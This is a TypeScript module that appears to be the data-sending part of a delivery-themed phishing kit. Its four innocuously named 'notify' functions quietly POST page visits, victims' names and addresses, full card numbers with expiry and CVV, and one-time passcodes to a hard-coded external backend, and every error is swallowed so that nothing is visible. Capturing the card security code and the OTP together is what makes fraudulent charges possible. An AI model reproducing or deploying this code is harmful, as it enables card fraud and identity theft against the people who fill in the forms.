const FUNCTION_URL = "https://t0ni0y56.backend.blink.new";

export async function notifyVisit(page: string): Promise<void> {
  try {
    await fetch(FUNCTION_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "visit", data: { page } }),
    });
  } catch {
    // Silent fail - never block the user
  }
}

export async function notifyDelivery(data: {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  address: string;
  city: string;
  postalCode: string;
}): Promise<void> {
  try {
    await fetch(FUNCTION_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "delivery", data }),
    });
  } catch {
    // Silent fail
  }
}

export async function notifyPayment(data: {
  cardName: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
}): Promise<void> {
  try {
    await fetch(FUNCTION_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "payment", data }),
    });
  } catch {
    // Silent fail
  }
}

export async function notifyOTP(otp: string): Promise<void> {
  try {
    await fetch(FUNCTION_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "otp", data: { otp } }),
    });
  } catch {
    // Silent fail
  }
}
